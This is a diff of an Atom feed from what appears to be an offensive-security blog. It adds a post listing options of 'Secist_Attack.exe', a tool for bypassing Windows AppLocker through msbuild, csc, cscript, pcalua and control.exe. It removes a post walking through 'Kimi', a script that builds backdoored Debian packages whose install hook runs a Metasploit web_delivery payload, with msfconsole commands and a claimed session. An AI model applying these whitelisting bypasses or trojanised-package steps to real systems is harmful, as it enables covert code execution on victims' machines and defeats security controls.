@@ -35,6 +35,24 @@
   </entry>
   
   <entry>
+    <title>secist_Apploacker_bypass</title>
+    <link href="www.ggsec.cn/secist-Apploacker-bypass.html"/>
+    <id>www.ggsec.cn/secist-Apploacker-bypass.html</id>
+    <published>2018-01-31T14:30:22.000Z</published>
+    <updated>2018-01-31T14:46:38.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="http://oc78wb8cz.bkt.clouddn.com/IMG_20180131_223511.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/secist_attack.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-c, --csc:            &lt;path&gt;    Example:  Secist_Attack.exe -c |or  --csc C:\Users\demon\secist.cs |and run secist.exe</span><br><span class="line">-C, --cscript:        &lt;path&gt;    Example:  Secist_Attack.exe -C |or  --cscript  C:\Users\demon\Payload\secist.txt</span><br><span class="line">-m, --msbuild:        &lt;path&gt;    Example:  Secist_Attack.exe -m |or  --msbuild  C:\Users\demon\Payload\secist.csproj</span><br><span class="line">-i, --cl_invocation:  &lt;Command&gt; Example:  Secist_Attack.exe -i |or  --cl_invocation  calc.exe</span><br><span class="line">                                                                  Secist_Attack.exe -i &quot;powershell.exe  calc&quot;</span><br><span class="line">-p, --pcalua:         &lt;APP&gt;     Example:  Secist_Attack.exe -p |or  --pcalua  calc.exe</span><br><span class="line">-l, --control:        &lt;DLL&gt;     Example:  Secist_Attack.exe -l |or  --control C:\Users\demon\example\runcalc.dll</span><br><span class="line">-A, --Applocker:      &lt;shell&gt;   Example:  Secist_Attack.exe -A |or  --Applocker</span><br><span class="line">-h, --help:           &lt;help&gt;    Example:  Secist_Attack.exe -h |or  --help     &lt;show help&gt;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">## 作者（About Us）：</span><br></pre></td></tr></table></figure><p>Who am I?</p><p>Hi there, I’m Demon. I have an interest in technology, both development of applications as well as systems administrations – focussing mostly on Linux and everything open source.</p><p>About my team</p><p>secist(<a href="http://www.secis.com" target="_blank" rel="noopener">http://www.secis.com</a>) is a volunteer group focused on promoting writers and their writing in a professional way, across different social media platforms for free.We provide a platform for those with a story to tell, knowledge to share, or an experience that we can all learn from. </p><p>If you are a new or emerging writer, work with us to raise your profile, polish your articles and present your work in the best possible light.</p><p>I will always remember something my father told me, “you have to help enough other people get what they want first, before you can get what you want out of life”.</p><p>Join us! Support secist in championing the work of others.</p><p>Contact</p><p>I’m best contacted through e-mail, at 1955270830@qq.com.Also welcome you to join our discussion group through QQ,account number 307283889.</p><p>You can ask me technological questions, but please don’t be mad if I don’t reply: I tend get a lot of e-mail. I do my best to respond to all of them – but that doesn’t always work. If I don’t respond in time, feel free to send a reminder.<br>```</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;http://oc78wb8cz.bkt.clouddn.com/IMG_20180131_223511.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>Vegile_Linux_Backdoor</title>
     <link href="www.ggsec.cn/Vegile-Linux-Backdoor.html"/>
     <id>www.ggsec.cn/Vegile-Linux-Backdoor.html</id>
@@ -409,28 +427,6 @@
     
     </summary>
     
-    
-  </entry>
-  
-  <entry>
-    <title>Linux_inject_kimi | MSF | kali linux 2017</title>
-    <link href="www.ggsec.cn/Linux-inject-kimi.html"/>
-    <id>www.ggsec.cn/Linux-inject-kimi.html</id>
-    <published>2017-10-15T03:15:21.000Z</published>
-    <updated>2017-10-15T05:01:34.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/B46C191A74189731E83B64602C5CF707.png" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/Linux-inject-kimi.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Kimi的名字灵感来源于“Kimimaro”，是动画片“火影忍者”的动画片之一。</span><br><span class="line">Kimi是一个为metasploit生成恶意debian软件包的脚本</span><br><span class="line">它由bash文件组成。 bash文件被部署到“/usr/local /bin/”目录中。</span><br><span class="line">当受害者尝试安装deb包由于postinst文件时，后门被执行</span><br><span class="line">Bash文件注入，也像一些受害者执行时的系统命令</span><br><span class="line">攻击者与会话点击。</span><br><span class="line"><span class="bullet">- </span>完全独立 意味着用户不需要安装任何debian包创建者</span><br><span class="line"><span class="bullet">- </span>可以与任何有效载荷发生器集成，</span><br><span class="line">Kimi基本上取决于web_delivery模块，每件事情都是自动化的。</span><br><span class="line">所有的攻击者需要做以下设置：</span><br></pre></td></tr></table></figure><p><img src="http://ojg8j426f.bkt.clouddn.com/1508039936984.jpg" alt="enter description here"></p><pre>msf > use exploit/multi/script/web_deliverymsf exploit(web_delivery) > set srvhost 192.168.0.102srvhost => 192.168.0.102msf exploit(web_delivery) > set uripath /SecPatchuripath => /SecPatchmsf exploit(web_delivery) > set Lhost 192.168.0.102Lhost => 192.168.0.102msf exploit(web_delivery) > show optionsmsf exploit(web_delivery) > exploit</pre>github: https://github.com/ChaitanyaHaritash/kimi<p></p><strong><span style="color: #ff0000;">声明：本文内容仅供交流学习使用，一切由使用者造成的法律问题，均由使用者自行承担！本站及作者概不负责！</span></strong><p></p>制作这种过程也是很简单,先来简单的看下帮助参数<pre>  -h, --help         列举一些帮助参数  -n NAME,  -n  参数 后面需要跟上Deb包的名称  -l LHOST, --lhost （-l 参数 后面需要跟上本机的IP    地址）                        LHOST, for Handler  -V VERS,  （-V 参数跟上随意指定版本信息以区分之前的包）  -a ARCH, --arch ARCH  Architecture (i386/amd64) （-a 参数 需指定平台架构 如i386/amd64）</pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>那么我们来简单看下需要用的参数:<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1508041138026.jpg" alt="enter description here"><br>&nbsp;</p><p>1.首先需要一个Deb 包：我这里随便弄了个包 之前有在 <a href="http://www.ggsec.cn/Debinject.html">http://www.ggsec.cn/Debinject.html</a> 用到过。<br>我这里重命名为f。便于写。<img src="http://ojg8j426f.bkt.clouddn.com/1508041076595.jpg" alt="enter description here"><br>那么-n 的参数跟上 f （以包名称为准）</p><p>2.填上ip地址 -l 192.168.1.103<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1508041273641.jpg" alt="enter description here"><br>&nbsp;</p><p> 3.添加平台架构  -a amd64 (我这里是64位的 所以填写amd64，根据目标机情况填写 )<br><img src="http://ojg8j426f.bkt.clouddn.com/1508041369868.jpg" alt="enter description here"></p><p>4.添加版本-V 参数跟上随意指定版本信息以区分之前的包 <img src="http://ojg8j426f.bkt.clouddn.com/1508041517597.jpg" alt="enter description here"></p><h2 id="生成并解压，得到会话"><a href="#生成并解压，得到会话" class="headerlink" title="生成并解压，得到会话"></a>生成并解压，得到会话</h2><p>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1508041977046.jpg" alt="enter description here"><br>&nbsp;<br>生成了backdoor<img src="http://ojg8j426f.bkt.clouddn.com/1508042235136.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1508042297286.jpg" alt="enter description here"><br>&nbsp;</p><p>在此期间会开启虚拟终端（xterm）<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1508042427222.jpg" alt="enter description here"><br><img src="http://ojg8j426f.bkt.clouddn.com/1508042205105.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1508042169268.jpg" alt="enter description here"><br>&nbsp;<br>这个是xterm<br><img src="http://ojg8j426f.bkt.clouddn.com/1508042349332.jpg" alt="enter description here"></p><p>解压backdoor<br><img src="http://ojg8j426f.bkt.clouddn.com/1508042528761.jpg" alt="enter description here"></p><p>并且得到会话<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1508037428945.jpg" alt="enter description here"></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/B46C191A74189731E83B64602C5CF707.png&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Metasploit" scheme="www.ggsec.cn/categories/Metasploit/"/>
-    
-    
-      <category term="Metasploit" scheme="www.ggsec.cn/tags/Metasploit/"/>
     
   </entry>
   
